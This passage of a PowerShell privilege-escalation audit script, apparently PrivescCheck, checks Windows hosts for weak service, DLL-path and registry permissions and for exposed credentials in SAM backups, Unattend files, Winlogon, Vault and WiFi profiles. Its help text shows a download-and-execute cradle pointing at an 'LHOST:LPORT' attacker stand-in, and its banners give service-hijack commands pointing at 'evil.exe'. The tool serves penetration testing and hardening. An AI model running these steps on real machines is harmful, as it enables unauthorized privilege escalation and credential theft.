                                        $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
                                        if ($ServiceStart) { $UserCanStart = $True; $Status = $ServiceStart.Status } else { $UserCanStart = $False }

                                        $ServiceItem = New-Object -TypeName PSObject 
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $UserCanStart
                                        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $UserCanRestart
                                        $ServiceItem

                                        break
                                    }
                                }
                                # We found the path returned by Get-ModifiablePath so we can exit the while loop 
                                break
                            }
                        } catch {
                            # because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                            # exit safely to avoid an infinite loop 
                            break 
                        }
                        $TempPath = $ParentPath
                    }
                }
            }
        }
    }
}

function Invoke-ServicesImagePermissionsCheck {
    <#
    .SYNOPSIS

    Enumerates all the services that have a modifiable binary (or argument)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    FIrst, it enumerates the services thanks to the custom "Get-ServiceList" function. For each
    result, it checks the permissions of the ImagePath setting thanks to the "Get-ModifiablePath"
    function. Each result is returned in a custom PS object. 
    
    .EXAMPLE

    PS C:\> Invoke-ServicesImagePermissionsCheck

    Name              : VulneService
    ImagePath         : C:\APPS\service.exe
    User              : LocalSystem
    ModifiablePath    : C:\APPS\service.exe
    IdentityReference : NT AUTHORITY\Authenticated Users
    Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
    Status            : Unknown
    UserCanStart      : False
    UserCanRestart    : False
    
    #>
    
    [CmdletBinding()] param()
    
    $Services = Get-ServiceList -FilterLevel 1

    ForEach ($Service in $Services) {

        $Service.ImagePath | Get-ModifiablePath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
            
            $Status = "Unknown"
            # Can we restart the service?
            $ServiceRestart = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'Restart'
            if ($ServiceRestart) { $UserCanRestart = $True; $Status = $ServiceRestart.Status } else { $UserCanRestart = $False }
    
            # Can we start the service?
            $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
            if ($ServiceStart) { $UserCanStart = $True; $Status = $ServiceStart.Status } else { $UserCanStart = $False }

            $ServiceItem = New-Object -TypeName PSObject 
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $Status
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $UserCanStart
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $UserCanRestart
            $ServiceItem
        }
    }
}

function Invoke-ServicesPermissionsCheck {
    <#
    .SYNOPSIS

    Enumerates the services the current can modify through the service manager. In addition, it 
    shows whether the service can be started/restarted. 
    
    Author: @itm4n
    License: BSD 3-Clause

    .DESCRIPTION

    This is based on the original "Get-ModifiableService" from PowerUp.
    
    .LINK

    https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

    #>
    
    [CmdletBinding()] param()

    # Get-ServiceList returns a list of custom Service objects 
    # The properties of a custom Service object are: Name, DisplayName, User, ImagePath, StartMode, Type, RegsitryKey, RegistryPath 
    # We also apply the FilterLevel 1 to filter out services which have an empty ImagePath 
    $Services = Get-ServiceList -FilterLevel 1

    # For each custom Service object in the list 
    ForEach ($Service in $Services) {

        # Get a 'real' Service object and the associated DACL, based on its name 
        $TargetService = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'ChangeConfig'

        if ($TargetService) {

            $ServiceRestart = Test-ServiceDaclPermission -Name $Service.Name -PermissionSet 'Restart'
            if ($ServiceRestart) { $UserCanRestart = $True } else { $UserCanRestart = $False }

            $ServiceStart = Test-ServiceDaclPermission -Name $Service.Name -Permissions 'Start'
            if ($ServiceStart) { $UserCanStart = $True } else { $UserCanStart = $False }

            $ServiceItem = New-Object -TypeName PSObject  
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Service.Name 
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Service.ImagePath 
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Service.User
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $TargetService.Status 
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanStart" -Value $UserCanStart
            $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "UserCanRestart" -Value $UserCanRestart
            $ServiceItem
        }
    }
}
# ----------------------------------------------------------------
# END SERVICES   
# ----------------------------------------------------------------

# ----------------------------------------------------------------
# BEGIN DLL HIJACKING   
# ----------------------------------------------------------------
function Invoke-DllHijackingCheck {
    <#
    .SYNOPSIS

    Checks whether any of the system path folders is modifiable

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    First, it reads the system environment PATH from the registry. Then, for each entry, it checks
    whether the current user has write permissions.

    #>
    
    [CmdletBinding()] param()
    
    $SystemPath = (Get-ItemProperty -Path "Registry::HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name "Path").Path 
    $Paths = $SystemPath.Split(';')

    ForEach ($Path in $Paths) {
        if ($Path -and $Path -ne '') {
            $Path | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $_
            }
        }
    }
}

function Invoke-HijackableDllsCheck {
    <#
    .SYNOPSIS

    Lists hijackable DLLs depending on the version of the OS

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    On Windows, some services load DLLs without using a "secure" search path. Therefore, they 
    try to load them from the folders listing in the %PATH% environment variable. If one of these
    folders is configured with weak permissions, a local attacker may plant a malicious version of
    a DLL in order to execute arbitrary code in the context of the service.
    
    .EXAMPLE

    PS C:\> Invoke-HijackableDllsCheck

    Name           : cdpsgshims.dll
    Description    : Loaded by CDPSvc upon service startup
    RunAs          : NT AUTHORITY\LOCAL SERVICE
    RebootRequired : True

    .EXAMPLE

    PS C:\> Invoke-HijackableDllsCheck

    Name           : windowsperformancerecordercontrol.dll
    Description    : Loaded by DiagTrack upon service startup or shutdown
    RunAs          : NT AUTHORITY\SYSTEM
    RebootRequired : True

    Name           : diagtrack_win.dll
    Description    : Loaded by DiagTrack upon service startup
    RunAs          : NT AUTHORITY\SYSTEM
    RebootRequired : True

    Name           : wlbsctrl.dll
    Description    : Loaded by IKEEXT upon service startup
    RunAs          : NT AUTHORITY\SYSTEM
    RebootRequired : True

    Name           : wlanhlp.dll
    Description    : Loaded by NetMan when listing network interfaces
    RunAs          : NT AUTHORITY\SYSTEM
    RebootRequired : False

    .LINK

    https://www.reddit.com/r/hacking/comments/b0lr05/a_few_binary_plating_0days_for_windows/?utm_source=amp&utm_medium=&utm_content=post_title
    #>

    [CmdletBinding()] param()

    function Test-DllExists {

        [CmdletBinding()] param (
            [string]$Name
        )

        $WindowsDirectories = New-Object System.Collections.ArrayList
        [void]$WindowsDirectories.Add($(Join-Path -Path $env:windir -ChildPath "System32"))
        [void]$WindowsDirectories.Add($(Join-Path -Path $env:windir -ChildPath "SysNative"))
        [void]$WindowsDirectories.Add($(Join-Path -Path $env:windir -ChildPath "System"))
        [void]$WindowsDirectories.Add($env:windir)

        ForEach ($WindowsDirectory in [string[]]$WindowsDirectories) {
            $Path = Join-Path -Path $WindowsDirectory -ChildPath $Name 
            $Null = Get-Item -Path $Path -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItem 
            if (-not $ErrorGetItem) {
                return $True
            }
        }
        return $False
    }

    function Test-HijackableDll {

        [CmdletBinding()] param (
            [string]$ServiceName,
            [string]$DllName,
            [string]$Description,
            [boolean]$RebootRequired = $True
        )

        $Service = Get-ServiceFromRegistry -Name $ServiceName 
        if ($Service -and ($Service.StartMode -ne "Disabled")) {

            if (-not (Test-DllExists -Name $DllName)) {

                $HijackableDllItem = New-Object -TypeName PSObject
                $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $DllName
                $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $Description
                $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value $Service.User
                $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "RebootRequired" -Value $RebootRequired 
                $HijackableDllItem
            }
        }
    }

    $OsVersion = [System.Environment]::OSVersion.Version

    if ($OsVersion.Major -eq 10) {

        Test-HijackableDll -ServiceName "CDPSvc" -DllName "cdpsgshims.dll" -Description "Loaded by CDPSvc upon service startup"
        Test-HijackableDll -ServiceName "Schedule" -DllName "WptsExtensions.dll" -Description "Loaded by the Task Scheduler upon servce startup"

    }

    # Windows 7, 8, 8.1
    if (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -ge 1) -and ($OsVersion.Minor -le 3)) {

        Test-HijackableDll -ServiceName "DiagTrack" -DllName "windowsperformancerecordercontrol.dll" -Description "Loaded by DiagTrack upon service startup or shutdown"
        Test-HijackableDll -ServiceName "DiagTrack" -DllName "diagtrack_win.dll" -Description "Loaded by DiagTrack upon service startup"

    }

    # Windows Vista, 7, 8
    if (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -ge 0) -and ($OsVersion.Minor -le 2)) {

        $RebootRequired = $True
        $Service = Get-Service -Name "IKEEXT" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetService
        if ((-not $ErrorGetService) -and ($Service.Status -eq "Stopped")) {
            $RebootRequired = $False
        }

        Test-HijackableDll -ServiceName "IKEEXT" -DllName "wlbsctrl.dll" -Description "Loaded by IKEEXT upon service startup" -RebootRequired $RebootRequired

    }

    # Windows 7
    if (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -eq 1)) {

        Test-HijackableDll -ServiceName "NetMan" -DllName "wlanhlp.dll" -Description "Loaded by NetMan when listing network interfaces" -RebootRequired $False

    }

    # Windows 8, 8.1, 10
    if (($OsVersion.Major -eq 10) -or (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -ge 2) -and ($OsVersion.Minor -le 3))) {

        Test-HijackableDll -ServiceName "NetMan" -DllName "wlanapi.dll" -Description "Loaded by NetMan when listing network interfaces" -RebootRequired $False
        
    }
}
# ----------------------------------------------------------------
# END DLL HIJACKING   
# ----------------------------------------------------------------
#endregion Checks

# ----------------------------------------------------------------
# Main  
# ----------------------------------------------------------------
#region Main
function Write-Banner {
    [CmdletBinding()] param(
        [string]$Category,
        [string]$Name,
        [ValidateSet("Info", "Conf", "Vuln")]$Type,
        [string]$Note
    )

    function Split-Note {
        param([string]$Note)
        $NoteSplit = New-Object System.Collections.ArrayList
        $Temp = $Note 
        do {
            if ($Temp.Length -gt 53) {
                [void]$NoteSplit.Add([string]$Temp.Substring(0, 53))
                $Temp = $Temp.Substring(53)
            } else {
                [void]$NoteSplit.Add([string]$Temp)
                break
            }
        } while ($Temp.Length -gt 0)
        $NoteSplit
    }

    $Title = "$($Category.ToUpper()) > $($Name)"
    if ($Title.Length -gt 46) {
        throw "Input title is too long."
    }

    $Result = ""
    $Result += "+------+------------------------------------------------+------+`r`n"
    $Result += "| TEST | $Title$(' '*(46 - $Title.Length)) | $($Type.ToUpper()) |`r`n"
    $Result += "+------+------------------------------------------------+------+`r`n"
    Split-Note -Note $Note | ForEach-Object {
        $Result += "| $(if ($Flag) { '    ' } else { 'DESC'; $Flag = $True }) | $($_)$(' '*(53 - ([string]$_).Length)) |`r`n"
    }
    $Result += "+------+-------------------------------------------------------+"
    $Result
}

function Invoke-PrivescCheck {
    <#
    .SYNOPSIS

    Enumerates common security misconfigurations that can be exploited of privilege escalation
    pourposes. 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    This script aims to identify security misconfigurations that are relevant for privilege 
    escalation. It also provides some additional information that may help penetration testers to 
    choose between several potential exploits. For example, if you find that a service is 
    vulnerable to DLL hijacking but you can't restart it manually, you will find useful to know
    hos often the machine is rebooted (in the case of a server). If you see that it is rebooted 
    every night for instance, you may want to attempt an exploit. 
    
    .EXAMPLE

    PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck 

    .EXAMPLE 

    C:\Temp\>powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck"

    .EXAMPLE

    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-P
    rivescCheck.ps1'; Invoke-PrivescCheck" 

    #>

    [CmdletBinding()] param()

    ### This check was taken from PowerUp.ps1
    # https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

    if($IsAdmin){
        "[+] Current user already has local administrative privileges! Safely exiting."

        # We don't want to continue, otherwise the script will identify almost everything as 
        # exploitable and thus generate a loooot of output. 
        return
    }

    Write-Banner -Category "user" -Name "whoami" -Type Info -Note "Gets the name and the SID of the current user."
    $Results = Invoke-UserCheck
    if ($Results) {
        "[*] Found some info:"
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "user" -Name "whoami /groups" -Type Conf -Note "Gets the non-default groups the current user belongs to."
    $Results = Invoke-UserGroupsCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) non-default group(s)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] No non-default group found."
    }

    "`r`n"

    Write-Banner -Category "user" -Name "whoami /priv" -Type Conf -Note "Gets the privileges of the current user which can be leveraged for elevation of privilege."
    $Results = Invoke-UserPrivilegesCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) potentially interesting privilege(s)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] No interesting privilege found."
    }

    "`r`n"

    Write-Banner -Category "user" -Name "Environment Variables" -Type Conf -Note "Checks environment variable for sensitive data."
    $Results = Invoke-UserEnvCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) potentially interesting result(s)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing interesting in the user's env."
    }

    "`r`n"

    Write-Banner -Category "services" -Name "Non-default Services" -Type Info -Note "Checks for third-party services."
    $Results = Invoke-InstalledServicesCheck
    if (([object[]]$Results).Length -gt 0) {
        "[*] Found $(([object[]]$Results).Length) service(s)."
        $Results | Select-Object -Property Name,DisplayName | Format-Table
        $Results | Format-List 
    } else {
        "[!] No third-party service found."
    }

    "`r`n"

    Write-Banner -Category "services" -Name "Service Permissions" -Type Vuln -Note "Checks for services which are modifiable through the Service Control Manager (sc.exe config VulnService binpath= C:\Temp\evil.exe)."
    $Results = Invoke-ServicesPermissionsCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) vulnerable service(s)."
        $Results | Format-List 
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "services" -Name "Service Permissions (Registry)" -Type Vuln -Note "Checks for services which are modifiable through the registry (reg.exe add HKLM\[...]\Services\VulnService /v ImagePath /d C:\Temp\evil.exe /f)."
    $Results = Invoke-ServicesPermissionsRegistryCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) result(s)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"
    
    Write-Banner -Category "services" -Name "Service Binary Permissions" -Type Vuln -Note "Checks for modifiable service binaries (copy C:\Temp\evil.exe C:\APPS\MyCustomApp\service.exe)."
    $Results = Invoke-ServicesImagePermissionsCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) result(s)."
        $Results | Format-List 
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "services" -Name "Unquoted Paths" -Type Vuln -Note "Checks for service unquoted image paths (C:\APPS\Foo Bar\service.exe -> copy C:\Temp\evil.exe C:\APPS\Foo.exe)."
    $Results = Invoke-ServicesUnquotedPathCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) result(s)"
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "DLL Hijacking" -Name "System's %PATH%" -Type Vuln -Note "Checks for system %PATH% folders configured with weak permissions."
    $Results = Invoke-DllHijackingCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) result(s)."
        $Results | Format-List 
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "DLL Hijacking" -Name "Hijackable DLLs" -Type Info -Note "Lists known hijackable DLLs on this system."
    $Results = Invoke-HijackableDllsCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) result(s)."
        $Results | Format-List 
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Applications" -Name "Non-default Applications" -Type Info -Note "Lists non-default and third-party applications."
    $Results = Invoke-InstalledProgramsCheck
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) non-default application(s)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`r`n"
    
    Write-Banner -Category "Applications" -Name "Modifiable Applications" -Type Vuln -Note "Checks for non-defaut applications with a modifiable executable."
    $Results = Invoke-ModifiableProgramsCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) file(s)."
        $Results | Format-Table
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Applications" -Name "Programs Run on Startup" -Type Info -Note "Lists applications which are run on startup."
    $Results = Invoke-ApplicationsOnStartupCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) application(s)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Applications" -Name "Scheduled Tasks" -Type Vuln -Note "Checks for scheduled tasks with a modifiable executable."
    $Results = Invoke-ScheduledTasksCheck -Filtered
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) result(s)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Applications" -Name "Running Processes" -Type Info -Note "Lists processes which are not owned by the current user. Common processes such as 'svchost.exe' are filtered out."
    $Results = Invoke-RunningProcessCheck
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) process(es)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Credentials" -Name "SAM/SYSTEM Backup Files" -Type Vuln -Note "Checks for readable backups of the SAM/SYSTEM files."
    $Results = Invoke-SamBackupFilesCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) readable file(s)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Credentials" -Name "Unattended Files" -Type Vuln -Note "Checks for Unattend files containing cleartext passwords."
    $Results = Invoke-UnattendFilesCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) password(s)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Credentials" -Name "WinLogon" -Type Vuln -Note "Checks for cleartext passwords in the Winlogon registry key. Empty passwords are filtered out."
    $Results = Invoke-WinlogonCheck
    if ($Results) {
        "[*] Found some info:"
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Credentials" -Name "Credential Files" -Type Info -Note "Lists credential files in the current user's HOME folder."
    $Results = Invoke-CredentialFilesCheck
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) file(s)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Credentials" -Name "Credential Manager" -Type Info -Note "Checks for saved credentials in Windows Vault."
    $Results = Invoke-VaultCredCheck
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) result(s)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Credentials" -Name "Credential Manager (web)" -Type Info -Note "Checks for saved web credentials in Windows Vault."
    $Results = Invoke-VaultListCheck
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) result(s)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Credentials" -Name "GPP Passwords" -Type Vuln -Note "Checks for cached Group Policy Preferences containing a 'cpassword' field."
    $Results = Invoke-GPPPasswordCheck
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) credential(s)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Registry" -Name "UAC Settings" -Type Conf -Note "Checks User Access Control (UAC) configuration."
    $Results = Invoke-UacCheck
    if ($Results) {
        "[*] UAC status:"
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }
    
    "`r`n"

    Write-Banner -Category "Registry" -Name "LSA RunAsPPL" -Type Conf -Note "Checks whether 'lsass' runs as a Protected Process Light."
    $Results = Invoke-LsaProtectionsCheck
    if ($Results) {
        "[*] Found some info."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Registry" -Name "LAPS Settings" -Type Conf -Note "Checks whether LAPS is configured and enabled."
    $Results = Invoke-LapsCheck
    if ($Results) {
        "[*] LAPS status:"
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }
    
    "`r`n"

    Write-Banner -Category "Registry" -Name "PowerShell Transcription" -Type Conf -Note "Checks whether PowerShell Transcription is configured and enabled."
    $Results = Invoke-PowershellTranscriptionCheck
    if ($Results) {
        "[*] PowerShell Transcription is configured (and enabled?)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }
    
    "`r`n"

    Write-Banner -Category "Registry" -Name "AlwaysInstallElevated" -Type Conf -Note "Checks whether the 'AlwaysInstallElevated' registry key is configured and enabled."
    $Results = Invoke-RegistryAlwaysInstallElevatedCheck
    if ($Results) {
        "[+] AlwaysInstallElevated is enabled."
        $Results | Format-List
    } else {
        "[!] AlwaysInstallElevated isn't enabled."
    }
    
    "`r`n"

    Write-Banner -Category "Registry" -Name "WSUS Configuration" -Type Conf -Note "Checks whether WSUS is configured, enabled and vulnerable to the 'Wsuxploit' MITM attack (https://github.com/pimps/wsuxploit)."
    $Results = Invoke-WsusConfigCheck
    if ($Results) {
        "[*] Found some info."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }
    
    "`r`n"

    Write-Banner -Category "Network" -Name "TCP Endpoints" -Type Info -Note "Lists all TCP endpoints along with the corresponding process."    
    $Results = Invoke-TcpEndpointsCheck #$Results = Invoke-TcpEndpointsCheck -Filtered
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) TCP endpoints."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Network" -Name "UDP Endpoints" -Type Info -Note "Lists all UDP endpoints along with the corresponding process. DNS is filtered out."
    $Results = Invoke-UdpEndpointsCheck #$Results = Invoke-UdpEndpointsCheck -Filtered
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) UDP endpoints."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Network" -Name "Saved Wifi Profiles" -Type Info -Note "Checks for WEP/WPA-PSK keys and passphrases in saved Wifi profiles."
    $Results = Invoke-WlanProfilesCheck
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) saved Wifi profiles."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Misc" -Name "Last Windows Update Date" -Type Info -Note "Gets Windows update history. A system which hasn't been updated in the last 30 days is potentially vulnerable."
    $Results = Invoke-WindowsUpdateCheck 
    if ($Results) {
        "[*] Last update time:"
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Misc" -Name "OS Version" -Type Info -Note "Gets the detailed version number of the OS. If we can't get the update history, this might be useful."
    $Results = Invoke-SystemInfoCheck
    if ($Results) {
        "[*] Found some info."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Misc" -Name "Local Admin Group" -Type Info -Note "Lists the members of the local 'Administrators' group."
    $Results = Invoke-LocalAdminGroupCheck
    if (([object[]]$Results).Length -gt 0) {
        "[*] The default local admin group has $(([object[]]$Results).Length) member(s)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }
    
    "`r`n"

    Write-Banner -Category "Misc" -Name "User Home Folders" -Type Conf -Note "Lists HOME folders and checks for write access."
    $Results = Invoke-UsersHomeFolderCheck
    if ($Results) {
        "[*] Found some info."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found"
    }

    "`r`n"

    Write-Banner -Category "Misc" -Name "Machine Role" -Type Info -Note "Gets the machine's role: Workstation, Server, Domain Controller."
    $Results = Invoke-MachineRoleCheck 
    if ($Results) {
        "[*] Found some info."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found"
    }

    "`r`n"

    Write-Banner -Category "Misc" -Name "System Startup History" -Type Info -Note "Gets the startup history. Some exploits require a reboot so this can be useful to know."
    $Results = Invoke-SystemStartupHistoryCheck
    if (([object[]]$Results).Length -gt 0) {
        "[*] Found $(([object[]]$Results).Length) startup event(s) in the last 31 days."
        "[*] Last startup time was: $(([object[]]$Results)[0].Time)"
        $Results | Select-Object -First 10 | Format-Table
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Misc" -Name "Last System Startup" -Type Info -Note "Gets the last system startup date based on the current tick count (potentially unreliable)."
    $Results = Invoke-SystemStartupCheck
    if ($Results) {
        "[*] Last startup event time:"
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`r`n"

    Write-Banner -Category "Misc" -Name "Filesystem Drives" -Type Info -Note "Lists partitions, removable storage and mapped network shares."
    $Results = Invoke-SystemDrivesCheck
    "[*] Found $(([object[]]$Results).Length) drive(s)."
    $Results | Format-Table -AutoSize

    "`r`n"
}
#endregion Main